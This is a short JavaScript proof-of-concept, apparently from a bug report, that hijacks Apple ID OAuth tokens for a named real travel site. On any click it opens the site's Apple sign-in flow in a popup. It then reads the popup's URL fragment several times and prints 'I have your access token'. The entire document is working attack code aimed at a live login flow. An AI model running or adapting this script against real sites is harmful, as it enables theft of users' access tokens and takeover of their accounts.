document.body.innerHTML = '<h5>Click here to hijack token<h5>';

var loading; // Declare 'loading' variable in a broader scope

function handleOnClick() {
  // Open the first URL and close the new tab after 10 seconds
  var newTab = window.open('https://appleid.apple.com/auth/authorize?client_id=com.loveholidays.auth&redirect_uri=https%3A%2F%2Fwww.loveholidays.com%2Fauth%2Fapple%2F&response_type=code+id_token&state=eyJwcm92aWRlciI6ImFwcGxlIiwic2l0ZUNvZGUiOiJHQiIsInJlZGlyZWN0VXJsIjoiaHR0cHM6Ly93d3cubG92ZWhvbGlkYXlzLmNvbS9hdXRoL2FwcGxlLyIsImNvbnRpbnVlVXJsIjoiaHR0cHM6Ly93d3cubG92ZWhvbGlkYXlzLmNvbS8ifQ%3D%3D&scope=&response_mode=fragment');
  setTimeout(function() {
    newTab.close();
  }, 1000000);

setTimeout(function() {
    document.write('I have your access token: ' + newTab.location.href);
  }, 15000);

setTimeout(function() {
    document.write('I have your access token: ' + newTab.location.href);
  }, 18000);

setTimeout(function() {
    document.write('I have your access token: ' + newTab.location.href);
  }, 20000); 

setTimeout(function() {
    document.write('I have your access token: ' + newTab.location.href);
  }, 25000);
}
  
// Attach click event listener to the window object
window.onclick = handleOnClick;
